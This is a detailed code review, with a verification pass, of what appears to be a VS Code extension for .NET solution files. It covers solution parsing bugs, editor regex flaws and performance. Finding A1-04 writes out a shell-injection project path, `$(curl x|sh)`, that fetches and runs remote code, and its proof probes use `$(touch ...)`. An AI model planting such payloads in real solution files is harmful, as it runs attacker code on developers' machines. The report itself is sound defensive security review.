# Code review, area 1: solution model and file formats (2026-10-24)

Scope: `src/core/Solution.ts`, `src/core/Project.ts`, `src/handlers/`, `src/parsers/`, `src/services/projectItems/`, `src/services/unloadedProjects.ts`, plus `nodeIdService`, `solutionService`, `singleFlight`, `showAllFiles`, `core/jsonc.ts`. Method: [the review plan](../plans/2026-10-21-code-review.md). Every source file of the scope was read completely. The probes ran in a scratch copy (`/tmp/rev1/repo`, `node_modules` symlinked) as jest tests that drive the real functions, against real files and real `dotnet` (SDK 10.0.111, Linux). Windows-only behaviour was run with `path` mocked to `path.win32` where that was possible. Nothing in the repository was changed apart from this report.

## Summary

| Id | Severity | Proven? | One line |
|----|----------|---------|----------|
| A1-01 | bug | proven | `Solution.getProject` falls back to a path-prefix match: folders of `Foo.Tests` are looked up in `Foo` and expand to nothing |
| A1-02 | bug | proven | A `.sln`/`.slnx` changed outside the extension (git pull/checkout, `dotnet sln add` in a terminal) is parsed again, but its projects are not: a new project shows another project's data, a removed one stays in the model |
| A1-03 | bug | proven | Solution items written by Visual Studio (`docs\readme.md`) show as `docs\readme.md` with a missing path on Linux/macOS, and Remove from Solution does nothing on every OS (no error); Rename keeps the old entry and adds a new one |
| A1-04 | bug (security) | proven | `removeProject` runs a shell command built from the project path in the `.sln`: `$(...)` in that path is executed. `dotnet sln add/remove` have no timeout |
| A1-05 | bug | proven | `.sln`: Add/Rename Solution Folder accept a name a sibling already has; the build then fails with MSB5004 |
| A1-06 | bug | proven | `.sln`: Remove of a solution folder leaves non-.NET projects (`.sqlproj`, `.shproj`, `.esproj`...) at the root, and with lower-case GUIDs in `NestedProjects` keeps the children nested under the deleted folder (MSB5009, the solution no longer builds) |
| A1-07 | bug | proven | A self-closing `<Target ... />` hides everything up to the next `</Target>` from all text edits of project and props files: a package update fails, the reference circle check is blind, Remove Link refuses |
| A1-08 | bug | proven | `.slnx` editor ignores XML comments: moving a project to the root can put it inside a trailing comment, which silently removes it from the solution |
| A1-09 | bug | proven | Folders named `build`, `packages` or `coverage` never show in a project's tree, also when they hold compiled files or packed `build\*.targets`, also with Show All Files |
| A1-10 | risk (performance) | proven | Every project parse globs the whole project folder and keeps the list in memory, but nothing uses it: 1.6 s and 31k entries for a web project with 30k files under `wwwroot/lib` |
| A1-11 | bug | proven | `.sln` with an absolute project path outside the solution folder (another drive on Windows) cannot be loaded at all; on Linux the leading `/` of such paths is dropped |
| A1-12 | risk (Windows) | suspected | The `.sln` and `launch.json` watchers of `Solution` use absolute paths as glob strings: backslashes are not valid in VS Code globs, so on Windows they may never fire |
| A1-13 | risk (Windows) | suspected | The solution filter for unloaded projects lists the projects with `/`; MSBuild on Windows does not normalize filter entries, so builds with an unloaded project may fail with MSB5028 |
| A1-14 | risk | proven by reading | A deleted solution or project file disposes its model object, which stays in use: when the file comes back (e.g. a checkout seen as delete + create), the tree stays frozen until reload |
| A1-15 | risk | proven by reading | `renameProject` is not atomic: the file is renamed first, so a failed solution or reference write leaves a half-renamed project |
| A1-16 | cleanup | proven | Dead code, a folder watcher subscription leak, silent catches |

---

## Findings

### A1-01 bug (proven): `getProject` returns the wrong project for paths below a project folder

`src/core/Solution.ts:355-363`. When there is no exact key match, the first project whose folder is a string prefix of the path wins:

```ts
if (projectPath.startsWith(path.dirname(storedPath)) || projectPath.startsWith(path.dirname(proj.projectPath))) {
    return proj;
```

There is no separator check, so `/x/src/Foo.Tests/Sub` "starts with" `/x/src/Foo`. A project in the solution folder itself (`App.sln` next to `App.csproj`) matches every path. Folder nodes carry only their path; their `project` is set only for nested projects (`Project.ts:775`). Folder expansion calls `solution.getProject(node.project ?? path)` (`solutionExpansionService.ts:166`, `:697`, `:390`), and so does the folder watcher creation (`:173`, `:396`).

Scenario: a `.sln` that lists `Foo` before `Foo.Tests` (the usual order when the test project is added later), and a folder `Foo.Tests/Sub` with a file in it. Expand `Sub` in the tree: it opens empty. The watcher for it is also created on `Foo`, so new files there make `Foo` evaluate again.

Proof (probe `probe.solution.test.ts`, which drives `SolutionExpansionService.handleExpandNode` and spies on `Project.getFolderChildren`):
```
getProject(Foo.Tests/Sub) -> Foo
[WRN] Project: Could not find node for path: /tmp/rev1-6V5spq/src/Foo.Tests/Sub
getFolderChildren calls: [ 'Foo: 0 children' ]
```
`.slnx` files written by `dotnet` sort `Foo.Tests/` before `Foo/`, which hides the bug there. Fix direction: pick the project whose folder contains the path (`path.relative` without `..`, deepest match), or put the owning project into folder and file ids.

### A1-02 bug (proven): external changes to the solution file don't update the project list

`src/core/Solution.ts:216-230`. `handleSolutionFileChanged` only calls `parseSolutionFile()`. `initializeProjects()` runs only on load and after our own `addProject`, `removeProject`, `renameProject` and `refresh`. `SolutionWebviewProvider._getSolutionData` reuses the active solution (`SolutionWebviewProvider.ts:373-380`). The tree is built from `solutionFile.projects` and looks each one up with `getProject` (`solutionTreeService.ts:154`).

Scenario: `git pull` (or `dotnet sln add` in a terminal, or a branch switch) adds `src/Foo.Api/Foo.Api.csproj`. `getProject(Foo.Api.csproj)` falls through to the prefix match of A1-01 and returns `Foo`. The new node then gets `Foo`'s executable, library and test flags, and expanding it lists `Foo`'s files. Without a prefix match it gets no children at all. A project removed outside stays in `solution.projects`, with its watchers and evaluations, and still appears in `getDotNetProjects()` (used by rename retargeting and other callers).

Proof (same probe, after writing a `.sln` with `Foo.Api` and calling `handleSolutionFileChanged`):
```
projects in model: [ 'Foo.csproj' ]
getProject(Foo.Api.csproj) -> Foo
```
Fix direction: diff the project list after each parse, create and dispose `Project`s for the difference, and keep the others (with their expansion state).

### A1-03 bug (proven): solution items with backslash paths (as Visual Studio writes them)

Visual Studio writes `docs\readme.md = docs\readme.md` into `ProjectSection(SolutionItems)`.
- Display on Linux/macOS: `solutionTreeService.ts:199-201` and `Solution.ts:268-272` call `path.basename` and `path.resolve` on the raw value. On POSIX the backslash is not a separator, so the node is named `docs\readme.md` and its path is `<sln dir>/docs\readme.md`, which does not exist (opening it fails).
  Proof: `solution item node: name = "docs\\readme.md" path = "/tmp/rev1-4WO0nH/docs\\readme.md" exists = false`
- Remove from Solution, every OS: `Solution.ts:831` turns the path into `docs/readme.md`, and `removeSolutionItemFromFile` (`:1208`) compares it exactly with the trimmed line `docs\readme.md = docs\readme.md`. Nothing matches, the file is written back unchanged and the only trace is a `log.warn`, so the user sees no error and nothing happens.
  Proof: `remove: threw? false | file changed? false | still listed? true`
- Rename (`solutionActionService.ts:459-461` = remove + add): the file is renamed on disk, the old entry stays (now pointing to a missing file), and a second entry `docs/readme2.md` is added.
- Also: the `.sln` removal takes the first matching line in any folder, not in the folder of the node (`removeSolutionItem` gets no folder). `.slnx` `removeFile` removes the file from every folder that lists it.

`moveSolutionItemLines` (`:984-998`) already normalizes `\`/`/` and case; the remove path does not. Fix direction: normalize separators (and case on Windows) for the comparison, restrict the match to the folder's block, and resolve the item path with `\` turned into `/` before `path.resolve`.

### A1-04 bug, security (proven): shell injection through the project path in `removeProject`

`src/core/Solution.ts:1379-1388`:
```ts
const command = `dotnet sln "${this._solutionPath}" remove "${relativePath}"`;
await execAsync(command, { cwd: solutionDir });
```
`relativePath` comes from the solution file of the opened repository. Inside double quotes, `sh` still expands `$(...)` and backticks, and `cmd.exe` expands `%VAR%`. A cloned repository whose `.sln` names a project `src\$(curl x|sh)\X.csproj` (the folder does not need to exist) runs that command when the user picks Remove on the project.

Proof (probe `probe.remove.test.ts`, path `src\$(touch <dir>/MARKER)\X.csproj`):
```
project path in the model: /tmp/rev1-rm-ulGZfC/src/$(touch /tmp/rev1-rm-ulGZfC/MARKER)/X.csproj
marker file created by the shell: true
```
A legitimate folder name with `$` (e.g. `$Generated`) breaks the same way. `addProject` already uses `execFile`, but like `removeProject` it has no `timeout` (the checklist asks for one on every external process). Fix: `execFile('dotnet', ['sln', solutionPath, 'remove', relativePath], { timeout })`.

### A1-05 bug (proven): `.sln` accepts duplicate solution folder names

`Solution.addSolutionFolder` (`:485-561`) checks the characters of the name but not whether a sibling already has it. `renameSolutionFolder` (`:721-773`) does the same. The `.slnx` editor and `moveToSolutionFolder` do refuse taken names.

Proof (probe `probe.dupfolder.test.ts` on a `dotnet new sln` solution, then real `dotnet build`):
```
second add: added | folders now: [ 'src', 'src' ]
Dup.sln : Solution file error MSB5004: The solution file has two projects named "src".
```

### A1-06 bug (proven): removing a `.sln` solution folder leaves broken nesting

`Solution.ts:672-699`, `:1064-1134`.
1. Only children that `isDotNetProject` (`.csproj/.vbproj/.fsproj`) or are folders get removed. Other projects in the folder (`.sqlproj`, `.shproj`, `.esproj`, `.dcproj`, `.vcxproj`) keep their `Project` block, lose their `NestedProjects` line, and so move to the solution root. Visual Studio removes them with the folder.
   Proof: the `.sqlproj` block is still there after removing folder `db`, and an empty `GlobalSection(NestedProjects)` is left behind.
2. GUIDs are compared case-sensitively: `buildProjectHierarchy` (`solutionFileParser.ts:367-399`) keys by the raw `NestedProjects` text, and `removeNestedProjectEntries` uses `line.includes(guid)`. When `NestedProjects` uses lower-case GUIDs (hand merges, some generators; `dotnet build` accepts them), no children are found. Only the folder block goes, and the children stay nested under a GUID that no longer exists.
   Proof (real `dotnet build` before and after): before, `Build succeeded.`; after removing the folder, `Case2.sln : Solution file error MSB5009: ... It is nested under "{6c4d298b-...}" but that project is not found in the solution.`
3. Cleanup: the `ProjectConfigurationPlatforms` lines of removed projects are left behind (tolerated by MSBuild and VS, but noise in diffs).

### A1-07 bug (proven): a self-closing `<Target />` hides the rest of the file from the editors

`src/parsers/projectFileEditor.ts:77-80`:
```ts
/<!--[\s\S]*?-->|<Target\b[\s\S]*?<\/Target\s*>/g
```
`<Target Name="CI" DependsOnTargets="Build;Test" />` has no closing tag, so the range runs to the next `</Target>`. Every item in between counts as "inside a target". The same ranges are used by `centralPackageEdits`, `projectReferences`, `linkedItems`, `protobufReferences` and `centralPackageFiles`.

Proof (probes `probe.target.test.ts` and `probe.editor.test.ts`, with a `Target` aggregate before the items and a normal target after them):
```
projectReferencesIn -> []                      (the duplicate and circle checks of a drop onto Dependencies see no references)
removeLinkedItem -> false                      (Remove Link says the link is not in the project file)
setPackageVersion -> THROWS No <PackageVersion Include="Serilog"> in the file
addPackageVersion -> a second <PackageVersion Include="Serilog"> is appended
```
For the last one, real `dotnet restore` reports `warning NU1506: Duplicate 'PackageVersion' items found` (an error with `TreatWarningsAsErrors`). Include In Project leaves the hidden `Remove` and adds `<Compile Include>` after it: the file is included, but the project file gets both. Fix: match `<Target\b(?:[^>"']|"[^"]*"|'[^']*')*?\/>` first, or match `<Target ...>` only when its opening tag is not self-closing.

### A1-08 bug (proven): `.slnx` editor treats commented-out elements as real

`src/parsers/solutionXFileEditor.ts:13-15` (FOLDER/FILE/PROJECT regexes) and `findProjects`/`findFolders` do not skip `<!-- ... -->`. The parser (xml2js) does skip comments, so the editor and the model disagree.

Proof (probe `probe.slnxcomment.test.ts`, a `.slnx` ending with `<!-- <Project Path="Old/Old.csproj" /> -->`, `moveProject('Lib/Lib.csproj', [])`, which is what dragging to the root does):
```
  <Project Path="App/App.csproj" />
  <!-- <Project Path="Old/Old.csproj" />
  <Project Path="Lib/Lib.csproj" /> -->
projects after: [ 'App/App.csproj' ]
```
The moved project is silently dropped from the solution. In the same way, `addFolder(['old'])` is refused when only a commented `<Folder Name="/old/" />` exists, and `removeFolder` or a rename would edit text inside a comment. Fix: blank comments (same offsets) before matching, as `ProjectFileEditor.blankIgnored` does.

### A1-09 bug (proven): `build`, `packages`, `coverage` folders are never shown in project trees

`Project.loadFolderChildren` drops every directory for which `shouldSkipDirectory` is true (`Project.ts:363`) before the item overlay is applied. `SKIP_DIRECTORIES` (`core/constants.ts:10-13`) contains `build`, `packages` and `coverage`, besides `bin/obj/.git/node_modules`. Only `bin`/`obj` come back with Show All Files.

Proof (probe `probe.build.test.ts`, real `runMsbuild` on a library with `<None Include="build\**" Pack="true" PackagePath="build" />`, the usual layout for NuGet package authors):
```
MSBuild items: build/MyLib.targets=true, packages/PackageInfo.cs=true, coverage/CoverageHelper.cs=true, Models/A.cs=true
tree root: [ 'Models' ]
tree root with Show All Files: [ 'Models', 'MyLib.csproj' ]
```
Compiled code in such a folder can't be opened, renamed or excluded from the tree. The watchers' `isExcluded` (`**/build/**`) also ignores their events. Fix: show any directory that `items.hasIncludedUnder()`, and keep the hard skip for `.git`, `node_modules`, `.vs` only.

### A1-10 risk, performance (proven): an unused glob of the whole project folder on every parse

`Project.parseProjectFile` (`Project.ts:308-311`) calls `ProjectFileParser.parseProjectFiles` (`projectFileParser.ts:60-98`), which runs `glob('**/*')` over the project folder and builds `files`/`directories`. Only `.dependencies` is used: `_projectStructure` is read nowhere else, and the tree is read lazily per folder. This runs at load for each project, on every change of a project file, and for every project after each `addProject`, `removeProject`, `renameProject` and `refresh` (`initializeProjects` disposes and re-creates all of them).

Proof (probe `probe.glob.test.ts`, a web project with 30,000 files under `wwwroot/lib`):
```
parseProjectFiles: 1654 ms, 31204 file entries kept in memory
parseDependencies alone: 0 ms
```
A project in the repository root (`App.csproj` next to `App.sln`) globs the whole repository, including the other projects. `waitForProjectInitialization` only waits 5 s per project, after which the solution loads with uninitialized projects. Fix: call only `parseDependencies`, and drop `files`/`directories`/`getDefaultItemType`.

### A1-11 bug (proven): absolute project paths in a `.sln`

`solutionFileParser.ts:193-228`.
- An absolute path outside the solution folder throws `Invalid project path ... (absolute path outside solution)`, and one bad project line fails the whole solution load. On Windows, Visual Studio writes an absolute path when a project is on another drive.
  Proof (probe `probe.win32.test.ts`, `path` mocked to `path.win32`):
  ```
  D:\libs\Ext\Ext.csproj -> THROWS: Invalid project path: D:\libs\Ext\Ext.csproj (absolute path outside solution)
  ..\shared\Ext\Ext.csproj -> parsed
  ```
  The inside-check is a case-sensitive `startsWith`, so a drive letter in different case also throws.
- On POSIX, a path starting with `/` but not `/home/`, `/usr/` or `/opt/` gets its slash removed (`/workspaces/...` in dev containers, `/mnt/...`, `/tmp/...`) and is resolved under the solution folder. The probe's `/tmp/rev1-out-.../Ext.csproj` was "parsed" this way, to a path that does not exist.

Fix direction: accept absolute paths (Visual Studio does), and skip or mark a single bad project instead of failing the solution.

### A1-12 risk, Windows (suspected): `Solution`'s own watchers use a string glob of an absolute path

`Solution.ts:153` calls `createFileSystemWatcher(this._solutionPath)`, and `:172` does the same with `path.join(..., '.vscode', 'launch.json')`. On Windows these are `C:\...` strings. The VS Code API documentation (`@types/vscode` index.d.ts:2144) says: "a backslash (`\`) is not valid within a glob pattern ... use the relative pattern support". On any OS, glob metacharacters in the path (`[`, `{`, `*`) change the meaning. If these watchers don't fire, the model never parses again after an external `.sln` change, even though the `**/*.sln*` watcher in `extension.ts` triggers a tree refresh, and `launch.json` changes don't refresh the startup cache. `Project.ts:185` already uses `RelativePattern`. Not run (no VS Code was started, per CLAUDE.md). Verify in the Windows manual test, or simply switch to `new RelativePattern(dir, basename)`.

### A1-13 risk, Windows (suspected): solution filter entries with `/`

`unloadedProjects.ts:19` writes `projects` with `/`. MSBuild compares filter entries with the `.sln` relative paths after `FileUtilities.FixFilePath`, which converts only on non-Windows systems (from memory of the MSBuild source, not run here). On Windows, `src/Lib/Lib.csproj` would then not match `src\Lib\Lib.csproj`, and a build while a project is unloaded would fail with MSB5028. Visual Studio writes backslashes, and backslashes work on Linux too (verified: `dotnet build` of a `.slnf` with `"Lib\\Lib.csproj"` succeeded on Linux). Fix: write `path.sep`-independent backslashes, and add a Windows CI test that builds a filter.

### A1-14 risk (proven by reading; trigger suspected): a deleted file kills its model object for good

- `Solution.handleSolutionFileDeleted` (`:232-235`) disposes the solution: watchers, emitters, projects. `SolutionService` still returns it as active, and `_getSolutionData` reuses it because `solutionPath` is set. When the file reappears, the tree is built from the last parse and never updates again.
- `Project.handleFileDeleted` (`:250-253`) disposes the project, but the `Solution` keeps it in `_projects` with its emitter and watchers disposed. After the file is recreated, its tree no longer reacts to changes.

Trigger: a checkout or tool that deletes and recreates the file, reported as two separate events (VS Code coalesces delete+create into a change only within one batch). Fix: on delete, mark the object stale, and on create (or on the next refresh) load it again.

### A1-15 risk (proven by reading): `renameProject` is not atomic

`Solution.ts:1347-1362` first renames the project file, then writes the solution file, then each referencing project. There is no try/rollback: if the solution file is read-only or locked (Windows, Visual Studio open), the project is renamed on disk while the solution still points to the old name. `ProjectReference`s written with properties (`$(SolutionDir)src\...`) are not matched by `retargetProjectReferences` and break without notice. State keyed by path is not moved: `UnloadedProjects`, launch configurations, the `ProjectItemsService` cache.

### A1-16 cleanup (proven)

- Dead code. `SolutionService.parseSolutionFile`, `readSolutionContent`, `writeSolutionContent`, `findProjectByGuid`, `getProjectPath`, `getProjectGuid`, `getProjectPaths` and `getSolutionStats` have no callers, and `parseSolutionFile` would parse a `.slnx` as `.sln`. Also unused: `SolutionXFileParser.serialize` (a TODO stub), `Solution.getProjectHierarchy`, `getProjectByGuid`, `fileTree`, `editSlnx` (a wrapper), `Project.getLoadedFilePaths`, `getWatchedFolders`, `getCollapsedState`/`setCollapsedState`, `isFolderExpanded`, `removeFolderWatcher`, and the `files`/`directories` of `ProjectFileParser` (A1-10).
- Leak. `removeFolderWatcher` is never called, so every expanded folder keeps a watcher until the `Project` is disposed. Each watcher's three listener disposables also go into `_disposables` (`Project.ts:1004-1017`), and `removeFolderWatcher` would leave those behind anyway. `_reevaluatedFor` (`Project.ts:99`) only grows.
- Silent errors. `SolutionFileParser.addTargetFrameworks` catches without a log line (`:167-170`). `Project`'s constructor calls `this.initialize()` without handling the promise, so if `setupFileWatcher` throws the rejection is unhandled. `removeSolutionItemFromFile` only warns (A1-03).
- Logging. `parseProject` logs five `info` lines per project on every parse (`solutionFileParser.ts:185-244`), and `getProject` logs every key on every call (`Solution.ts:342-343`).

## Checked and fine

- **Line endings and BOM in `.sln` edits.** `eolOf` keeps CRLF or LF. The BOM survives as `\uFEFF` in the string (`readFile('utf8')`/`writeFile('utf8')`), and the parser's `trim()` strips it. `renameProjectInSln` keeps the `\r` (`$` in multiline mode stops before it). The `.slnx` editor and `ProjectFileEditor` take the newline and indentation from the file.
- **MSBuild runs.** `runMsbuild` and `itemsWithoutExcludes` use `execFile` (no shell) with `timeout: 120000` and a 64 MB `maxBuffer`, and every failure path ends in a logged warning plus a retry with backoff (5 s, 30 s, 120 s). One evaluation took about 0.4-0.6 s here. Concurrency is `max(2, cpus/2)` (8 on 16 cores), so 100 projects take about 6-8 s of evaluation at load: acceptable.
- **`SingleFlight` / `ConcurrencyLimit`.** The slot is handed over without double counting, a dirty mark during a run re-runs once, and a rejection is passed on unless dirty. The existing tests cover this.
- **`ProjectItemsService`.** Stale-while-revalidate, versioning and `publish` listener errors are caught.
- **Path handling.** `pathKey` is case-insensitive on Windows and macOS. `holdsProject` and `inNestedProject` use `path.relative` (case-insensitive on win32). `itemPath` refuses targets outside the project, so `Remove="\**"` can't happen, and `escapeMsbuild` escapes the MSBuild special characters.
- **`moveToSolutionFolder`.** Case-insensitive GUIDs, the cycle check and the name check all hold.
- **Parse cost.** A 150-project `.sln` parses (including reading every project for its frameworks) in about 20 ms after warm-up.
- **The other `ProjectFileEditor` cases.** Single-quoted attributes, multi-line opening tags, block-form items, `Remove` lists with `;`, CRLF in `deleteElement`, and conditional or `Choose` ItemGroups as the last group (a new group is appended) all hold.
- **Smaller pieces.** `UnloadedProjects` normalizes paths consistently. `jsonc` edits keep EOL and indentation. `nodeIdService` encode/parse round-trips, and old gzip ids still parse.
- **Existing tests.** All 509 tests of the area (40 suites) pass on Linux.

## Not reviewed / limits of this review

- Nothing ran in VS Code itself (per CLAUDE.md): watcher behaviour (A1-12, A1-14) is inferred from the API documentation and the code. Nothing ran on Windows or macOS: Windows paths were only checked with `path.win32` in the parser probe, and A1-13 is from memory of MSBuild's source.
- Concurrent edits: solution edits are read-modify-write without a lock (`editSolutionText`, the line edits, `dotnet sln` runs). The code paths found run one after another (moves and multi-remove `await` each step), so no lost update was shown. Two webview actions that arrive within milliseconds could still interleave, and the NuGet manager and Include/Exclude can edit the same project file at the same time. Not probed.
- Not covered: undo (the extension writes files directly, outside VS Code's undo stack, by design), non-UTF-8 solution or project files (UTF-16, ANSI), `Choose`/`When` blocks in `parseDependencies` (references inside them are missing from the parser's list but come back with the MSBuild evaluation for packages), and very large single project files.
- The probes are scratch files in `/tmp/rev1/repo/src/test/unit/review/` and were not added to the repository. Each finding above names the probe that proves it.

## Verification (second pass, 2026-10-24)

Verifier's method: every cited line was reread at HEAD `7b1ff03`, callers and guards were searched, and each proof was rewritten from scratch (own probes, not the reviewer's) in a separate scratch copy (`/tmp/ver1/repo`, `node_modules` symlinked), using real `dotnet` (SDK 10.0.111, Linux) to create and build the solutions wherever MSBuild behaviour is claimed. No source file was changed; no VS Code was started. The table is filled in finding by finding (interruption-safe); evidence follows it.

| Id | Verdict | Severity after verification | Note |
|----|---------|-----------------------------|------|
| A1-01 | CONFIRMED | bug | Reproduced with a `.sln` made by `dotnet sln add` (Foo, then Foo.Tests): the default CLI order triggers it |
| A1-02 | CONFIRMED | bug | Reproduced with real `dotnet sln add/remove` after load; `Solution.refresh()` has no callers |
| A1-03 | CONFIRMED | bug | Display (Linux/macOS) and silent no-op Remove reproduced; Windows remove by reading |
| A1-04 | CONFIRMED | bug (security: defence in depth) | Reproduced for `.sln` and `.slnx`, without the reviewer's `isSystemPath` mock. Needs a trusted workspace and Remove/Delete plus confirmation. A real `$Gen` folder makes Remove a silent no-op |
| A1-05 | CONFIRMED | bug | Add and Rename both accept the duplicate; real `dotnet build` gives MSB5004 |
| A1-06 | CONFIRMED | bug | `.sqlproj`/`.shproj` left at root reproduced. Lower-case GUID case gives MSB5009 with real `dotnet build`, but needs a hand-edited file |
| A1-07 | CONFIRMED | bug | All four effects reproduced; real `dotnet restore` gives NU1506; MSBuild itself reads the file fine |
| A1-08 | CONFIRMED | bug | Reproduced; `dotnet sln list` agrees the project is gone. Needs a commented-out last root `Project` (rarer than worded) |
| A1-09 | CONFIRMED | bug | Reproduced with real MSBuild evaluation, Show All Files too |
| A1-10 | CONFIRMED | risk (performance) | 4.5 s / 30,604 entries here. Correction: the 5 s init wait is overall (`Promise.all`), not per project |
| A1-11 | CONFIRMED | bug | win32 probe: other drive and lower-case drive letter both throw. Real `dotnet build` accepts an absolute path that our parser mangles |
| A1-12 | PARTIALLY CONFIRMED | risk (rescoped) | Windows backslash suspicion REFUTED by VS Code `glob.ts` source (backslash paths match). Confirmed instead: `[`/`{` in the path, and solutions outside the workspace get no events |
| A1-13 | CONFIRMED by source (not run on Windows) | bug (Windows), up from risk | MSBuild `vs18.0` (SDK 10.0.1xx) uses `FixFilePath`, a no-op on Windows, so `/` entries fail with MSB5028. Fixed only on MSBuild `main` (PR #12730) |
| A1-14 | CONFIRMED (code path); trigger UNVERIFIED | risk | Worse than written: `dispose()` empties `_projects`, so recreated-solution project nodes expand to nothing |
| A1-15 | CONFIRMED | risk | Read-only `.sln` reproduces the half rename; `$(SolutionDir)` reference not retargeted. Correction: the startup launch config is moved |
| A1-16 | mostly CONFIRMED | cleanup | `editSlnx` is used (7 callers), just a redundant wrapper; the rest of the dead code list and the watcher leak hold |

Nothing was refuted outright. The corrections are A1-12 (the Windows part is wrong, other failure modes are real), A1-13 (raised to bug), A1-04 (the security impact is put in context), and smaller wording fixes to A1-10, A1-15 and A1-16.

### Per-finding evidence

**A1-01: CONFIRMED.** Reread `Solution.ts:341-370`: the second loop is a bare `startsWith(path.dirname(...))`, no separator check, and nothing upstream resolves folder ids to an owner (`Project.toProjectChild` sets `owner` only via `inNestedProject`). Own probe with a solution made by real `dotnet new sln --format sln` + `dotnet sln add src/Foo/Foo.csproj` + `dotnet sln add src/Foo.Tests/Foo.Tests.csproj` (dotnet keeps the add order: `Foo`, `Foo.Tests`): `getProject(src/Foo.Tests/Sub) -> Foo`, `getFolderChildren -> []` although `Sub/X.cs` exists. So the scenario is not hypothetical: it is the default result of adding the test project after the main one with the CLI. Severity bug stands.

**A1-02: CONFIRMED.** No caller of `Solution.refresh()` exists outside the class (grep); `handleSolutionFileChanged` only re-parses; the `extension.ts` `*.sln*` watcher only triggers `SolutionWebviewProvider._updateViewDebouncer`, which reuses the active `Solution`; `onDidParse` only refreshes startup state. Own probe: after a real `dotnet sln add src/Foo.Api/Foo.Api.csproj` and `handleSolutionFileChanged()`, `solutionFile.projects` lists `Foo.Api` but the model holds `[Foo.csproj, Foo.Tests.csproj]` and `getProject(Foo.Api.csproj) -> Foo`; after a real `dotnet sln remove` of `Foo.Tests`, the model still holds `Foo.Tests.csproj`. Severity bug stands.

**A1-03: CONFIRMED** (display part on Linux/macOS; remove part on every OS by reading, proven on Linux). Own probe with a VS-format `docs\readme.md = docs\readme.md` item: tree node name `"docs\\readme.md"`, path `<dir>/docs\readme.md`, `exists false`. `removeSolutionItem` with the correct path and with the node's path both leave the file byte-identical, no exception. On Windows `path.relative` gives `docs\readme.md`, which `.replace(/\\/g,'/')` turns into `docs/readme.md`, so the exact-line compare in `removeSolutionItemFromFile` fails there too (no Windows run, but the code path is OS-independent after that replace). The Rename consequence follows from `solutionActionService.ts:460-461` (remove, then add). Severity bug stands.

**A1-04: CONFIRMED, severity wording corrected (see below).** Own probe without the reviewer's `isSystemPath` mock (`/tmp` is not in `SYSTEM_DIRECTORIES`, so the mock was unnecessary; no guard rejects `$`, backticks or `%`): project path `src\$(touch <dir>/MARKER)\X.csproj` in a `.sln`, `removeProject` -> `MARKER` created. Second probe, a legitimate folder `src/$Gen/Gen.csproj` added with real `dotnet sln add`: `removeProject` returns **without error** and the project **stays in the `.sln`** (the shell expands `$Gen` to empty, `dotnet sln remove` of a non-matching path does not fail the call). So the non-security half is worse than "breaks": it silently does nothing.
- Who controls the path: whoever can write the solution file the user opens, i.e. anyone who can get a commit into the repository (a colleague, a pull request that is checked out, a cloned third-party repository). The path does not need to exist on disk; the project shows as a node that fails to parse.
- What the user must do: open the folder, **trust the workspace** (the extension declares no `capabilities.untrustedWorkspaces` in `package.json`, so per VS Code's workspace-trust rules it is not activated in Restricted Mode; not run, from the VS Code extension guide), then pick **Remove from Solution** or **Delete** on that project node and confirm the modal dialog (`solutionActionService.ts:831-838`, `:862-870`, multi-select `:1470`).
- `.slnx` is affected the same way: own probe with `<Project Path="src/$(touch MARKER)/X.csproj" />` in an `.slnx` -> `MARKER` created (`removeProject` does not branch on the format).
- Context for the severity: the extension's own MSBuild runs are evaluation only (`dotnet msbuild -getItem/-getProperty`, no target), and evaluation refuses writing property functions (own probe: `$([System.IO.File]::WriteAllText(...))` in a project -> `MSB4185 ... not available for execution as an MSBuild property function`). So this is the only place found where the extension itself turns repository content into a shell command; but in a trusted workspace a hostile committer can equally put an `Exec` target into a project, which runs on the first build or (not verified here) on a C# extension design-time build. Verdict: real bug, security-relevant as a defence-in-depth issue (code runs on a non-build action the user does not expect to execute anything), not a sandbox escape. The missing `timeout` on `dotnet sln add/remove` is confirmed by reading (`Solution.ts:1314`, `:1388`).

**A1-05: CONFIRMED.** Own probe on a real `dotnet new sln --format sln`: `addSolutionFolder('tools')` twice succeeds both times, the file holds two `"tools"` folder blocks, and real `dotnet build` fails with `MSB5004: The solution file has two projects named "tools"`. Rename: folders `a` and `b`, `renameSolutionFolder(b, 'a')` succeeds and leaves two `"a"` blocks. No caller-side guard: `solutionActionService` passes the input name straight through (reread). Severity bug stands.

**A1-06: CONFIRMED** (both parts). (1) Own probe with a folder holding `Db.sqlproj` and `Shared.shproj`: after `removeSolutionFolder`, both `Project` blocks are still in the file and their `NestedProjects` lines are gone, so they move to the root. (2) Own probe on a solution made by real `dotnet sln add ... --solution-folder libs` whose `NestedProjects` lines were then lower-cased: `dotnet build` before -> `Build succeeded.`; after `removeSolutionFolder(libs)` the folder block is gone, `Lib.csproj` and its lower-case nesting line remain, and `dotnet build` fails with `MSB5009 ... nested under "{6c4d298b-...}" but that project is not found in the solution`. Scenario note: `dotnet` and Visual Studio write upper-case GUIDs, so part (2) needs a hand-edited or third-party-generated file; part (1) hits any VS solution with database, shared or JS projects in a folder. That VS removes such projects with the folder is from Visual Studio behaviour, not run here. Severity bug stands.

**A1-07: CONFIRMED.** `projectFileEditor.ts:77-80` reread; all five listed callers use `ignoredRanges` (grep). Own probe (project with `<Target Name="CI" DependsOnTargets="Build;Test" />` before an ItemGroup and a normal target after it): `projectReferencesIn -> []` (control without the aggregate target: `[/x/Lib/Lib.csproj]`), `removeLinkedItem -> removed false` (control: `true`), `setPackageVersion` on a `Directory.Packages.props` with the same shape throws `No <PackageVersion Include="Newtonsoft.Json"> in the file`, `addPackageVersion` appends a second `PackageVersion`, and real `dotnet restore` then warns `NU1506: Duplicate 'PackageVersion' items found ... Newtonsoft.Json 13.0.1, Newtonsoft.Json 13.0.3`. Real `dotnet msbuild -getItem:PackageVersion` on the unmodified file sees the item, so MSBuild itself has no problem with the self-closing target; only our editor does. Severity bug stands (needs a self-closing target before the items, which is a common pattern for aggregate targets).

**A1-08: CONFIRMED.** Own probe: `.slnx` with `Lib` in folder `/libs/`, `App` at the root and a trailing `<!-- <Project Path="Old/Old.csproj" /> -->`; `moveProject('Lib/Lib.csproj', [])` puts `Lib` inside the comment. Real `dotnet sln S.slnx list` then lists only `App/App.csproj`, and our parser agrees (`['libs', 'App/App.csproj']`): the project is silently gone. `addFolder(['old'])` with only a commented `<Folder Name="/old/" />` throws `Solution folder "old" already exists`. Scenario note: needs a commented-out `Project` as the last root element (insertion goes after the last root element); less common than the reviewer's wording suggests, but the loss is silent. Severity bug stands.

